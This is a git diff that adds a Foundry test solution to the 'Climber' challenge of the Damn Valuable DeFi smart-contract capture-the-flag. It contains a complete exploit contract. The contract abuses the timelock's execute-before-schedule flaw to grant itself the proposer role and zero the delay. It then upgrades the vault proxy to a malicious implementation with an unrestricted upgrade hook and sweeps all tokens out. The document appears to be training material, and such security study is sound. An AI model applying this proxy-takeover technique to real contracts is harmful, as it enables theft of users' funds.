@@ -8,6 +8,10 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,7 +89,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Exploit ex = new Exploit(vault, timelock, token);
+        ex.attack(recovery);
     }
 
     /**
@@ -95,4 +100,70 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Exploit {
+    address[] targets = new address[](4);
+    uint256[] values = new uint256[](4);
+    bytes[] dataElements = new bytes[](4);
+    bytes32 salt = bytes32(0);
+
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token) {
+        vault = _vault;
+        timelock = _timelock;
+        token = _token;    
+    }
+
+    function attack(address _recovery) external {
+        // grant proposer role to admin
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSelector(
+            bytes4(0x2f2ff15d), 
+            PROPOSER_ROLE,
+            address(this)
+        );
+        // update delay to 0 
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSelector(
+            ClimberTimelock.updateDelay.selector, 
+            uint256(0)
+        );
+        // upgrades erc1967proxy contract
+        Fake_Vault fake_vault = new Fake_Vault();
+        targets[2] = address(vault);
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSelector(
+            UUPSUpgradeable.upgradeToAndCall.selector,
+            address(fake_vault),
+            abi.encodeWithSelector(Fake_Vault.sweepFunds.selector, address(_recovery), address(token))
+        );
+        // schedules every data
+        targets[3] = address(this);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSelector(
+            this.make_schedule.selector
+        );
+        timelock.execute(targets, values, dataElements, salt);
+    }
+
+    function make_schedule() external {
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+
+contract Fake_Vault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    function sweepFunds(address recovery, address token) external {
+        DamnValuableToken(token).transfer(recovery, DamnValuableToken(token).balanceOf(address(this)));        
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {}
 }
